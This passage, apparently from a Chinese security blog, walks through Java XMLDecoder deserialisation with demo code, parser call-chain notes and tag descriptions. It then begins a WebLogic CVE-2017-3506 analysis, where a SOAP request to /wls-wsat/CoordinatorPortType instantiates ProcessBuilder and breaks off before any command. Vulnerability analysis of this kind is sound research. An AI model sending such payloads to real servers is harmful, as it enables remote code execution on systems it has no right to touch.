&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Sex&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;setName has called&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setSex&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">sex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;setSex has called&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Sex&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setAge&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;setAge has called&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getAge&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getAge has called&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getSex&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getSex has called&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Sex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getName has called&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;User{&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Name=&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;\&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;, Sex=&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Sex&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;\&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;, Age=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Age&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;}&amp;#39;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">XMLDecoder&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.beans.XMLEncoder&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.BufferedOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.FileNotFoundException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.FileOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Debug&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">FileNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">User&lt;/span> &lt;span style="color:#111">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAge&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ame&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSex&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;girl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">XMLEncoder&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">XMLEncoder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User.xml&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出的User.xml&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;java&lt;/span> &lt;span style="color:#75af00">version=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1.7.0_21&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.beans.XMLDecoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;object&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;XMLDecoder.User&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">property=&lt;/span>&lt;span style="color:#d88200">&amp;#34;age&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;int&amp;gt;&lt;/span>18&lt;span style="color:#f92672">&amp;lt;/int&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">property=&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;string&amp;gt;&lt;/span>ame&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">property=&lt;/span>&lt;span style="color:#d88200">&amp;#34;sex&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;string&amp;gt;&lt;/span>girl&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/object&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将User.xml进行反序列化处理&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">unserial&lt;/span>&lt;span style="color:#f92672">()&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">FileNotFoundException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">XMLDecoder&lt;/span> &lt;span style="color:#111">xmlDecoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">XMLDecoder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User.xml&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">xmlDecoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">xmlDecoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>结合控制台的输出可以得知XMLEncoder序列化处理时默认调用相关的set和get方法，XMLEncoder反序列化处理时会调用set方法，值得注意的时这里用到的&lt;code>readObject&lt;/code>并非java反序列化原生的&lt;code>readObject&lt;/code>，只是同名而已，跟入看一下调用&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505164551575.png" alt="image-20220505164551575">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505164613714.png" alt="image-20220505164613714">&lt;/p>
&lt;p>可以看到核心的处理在&lt;code>XMLDecoder.this.handler.parse(XMLDecoder.this.input)&lt;/code>，继续跟入&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505165030725.png" alt="image-20220505165030725">&lt;/p>
&lt;p>继续跟入&lt;code>SAXParserFactory.newInstance().newSAXParser().parse(var1, DocumentHandler.this);&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505165127525.png" alt="image-20220505165127525">&lt;/p>
&lt;p>is是&lt;code>InputSource&lt;/code>对象，dh是默认的&lt;code>Handler&lt;/code>对象&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505165645333.png" alt="image-20220505165645333">&lt;/p>
&lt;p>可以看到这里的handlers是hashMap结构，其中记录了xml每一个标签对应的&lt;code>*ElementHandler&lt;/code>，比如array对应&lt;code>ArrayElementHandler&lt;/code>&lt;/p>
&lt;p>在经过if的判断后会对调用几个set方法来设置dh，随后继续调用&lt;code>com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl.JAXPSAXParser#parse(org.xml.sax.InputSource)&lt;/code>，这里就已经进入xerces的处理中了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505165956041.png" alt="image-20220505165956041">&lt;/p>
&lt;p>这里的&lt;code>super.parse&lt;/code>对应的是&lt;code>com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser#parse(org.xml.sax.InputSource)&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505171016078.png" alt="image-20220505171016078">&lt;/p>
&lt;p>调用set方法为InputSource对象的属性赋值，同时设置XML的编码方式，之后继续调用parse, parse, parse，直到&lt;code>com.sun.org.apache.xerces.internal.parsers.XML11Configuration#parse(boolean)&lt;/code>，跟入&lt;code>return fCurrentScanner.scanDocument(complete);&lt;/code>，进入对XML文档的遍历和解析的具体操作中&lt;/p>
&lt;p>后面的略掉（单纯因为太长了），来个非常nice的图&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011103427345.png" alt="image-20221011103427345">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/2723796-20220130184421120-2008545031.png" alt="xmlDecoder">&lt;/p>
&lt;h3 id="标签属性">标签&amp;amp;属性&lt;/h3>
&lt;ul>
&lt;li>&lt;code>&amp;lt;object&amp;gt;&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>表示对象，标签的值作为参数&lt;/p>
&lt;ul>
&lt;li>&lt;code>&amp;lt;method&amp;gt;&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>调用指定类的指定方法&lt;/p>
&lt;ul>
&lt;li>&lt;code>&amp;lt;string&amp;gt;&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>表示字符串&lt;/p>
&lt;ul>
&lt;li>&lt;code>&amp;lt;object&amp;gt;&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>表示对象，class属性指定具体类（用于调用其内部方法），method属性指定具体方法名称&lt;/p>
&lt;ul>
&lt;li>&lt;code>&amp;lt;void&amp;gt;&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>表示函数调用和赋值等操作，method属性指定具体的方法名称&lt;/p>
&lt;ul>
&lt;li>&lt;code>&amp;lt;array&amp;gt;&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>表示数组，class属性指定具体类，内部void标签的index属性表示根据具体数组的索引赋值&lt;/p>
&lt;h2 id="cve-2017-3506">CVE-2017-3506&lt;/h2>
&lt;p>在weblogic解析的过程中，前半部分大致和之前的XMLDecoder过程分析中是一样的，不过在DocumentHandler.parse()到SAXParserImpl.parse()的过程中多了两步RegistryXMLReader.parse()和WebLogicXMLReader.parse()，之后再正常衔接&lt;/p>
&lt;h3 id="过程分析">过程分析&lt;/h3>
&lt;h4 id="xmldecoder部分">XMLDecoder部分&lt;/h4>
&lt;pre tabindex="0">&lt;code>POST /wls-wsat/CoordinatorPortType
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;soapenv:Envelope&lt;/span> &lt;span style="color:#75af00">xmlns:soapenv=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;soapenv:Header&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;work:WorkContext&lt;/span> &lt;span style="color:#75af00">xmlns:work=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://bea.com/2004/06/soap/workarea/&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;java&lt;/span> &lt;span style="color:#75af00">version=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1.8.0_131&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.beans.XMLDecoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;array&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.String&amp;#34;&lt;/span> &lt;span style="color:#75af00">length=&lt;/span>&lt;span style="color:#d88200">&amp;#34;3&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">index=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
